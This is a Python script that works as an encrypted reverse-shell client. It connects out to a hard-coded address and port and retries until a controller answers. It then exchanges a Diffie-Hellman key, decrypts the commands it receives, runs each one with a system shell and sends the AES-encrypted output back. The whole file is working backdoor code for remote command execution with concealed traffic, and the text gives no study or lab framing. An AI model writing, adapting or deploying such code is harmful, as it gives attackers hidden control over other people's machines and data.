import socket
import pyDH
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad,unpad
from hashlib import md5
import subprocess
import chardet
from time import sleep

def _handShake(conn):
    DH = pyDH.DiffieHellman()
    DHCliPubKey = DH.gen_public_key()
    DHCliPubKey = DHCliPubKey.to_bytes(DHCliPubKey.bit_length(),'little')
    conn.sendall(DHCliPubKey)
    DHCSerPubKey = int.from_bytes(conn.recv(2048), 'little')
    key = DH.gen_shared_key(DHCSerPubKey)
    return md5(key.encode()).digest()

def encrypt(msg, key):
    aesObj = AES.new(key, AES.MODE_ECB)
    msgPad = pad(msg, 16)
    encMsg = aesObj.encrypt(msgPad)
    return encMsg

def decrypt(cipher, key):
    aesObj = AES.new(key, AES.MODE_ECB)
    msg = aesObj.decrypt(cipher)
    return msg

def buildConn():
    conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server = ('127.0.0.1', 9011)
    while True:
        try:
            conn.connect(server)
            break
        except:
            sleep(10)
            
    return conn


if __name__ == "__main__":
    conn = buildConn()
    key = _handShake(conn)
    while True:
        cmd = b''
        data = b''
        LASTBLOCK = False
        while not LASTBLOCK:
            data = conn.recv(16)
            msgPad = b''
            msgPad = decrypt(data, key)
            try:
                msgPad = unpad(msgPad, 16)
                LASTBLOCK = True
            except:
                pass
            finally:
                cmd += msgPad
        encoding = chardet.detect(cmd).get("encoding") if chardet.detect(cmd).get("encoding") else 'GBK'
        cmd = cmd.decode(encoding=encoding,errors='backslashreplace')
        res = subprocess.run(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        res = res.stdout if res.stdout else res.stderr
        conn.sendall(encrypt(res,key))
        
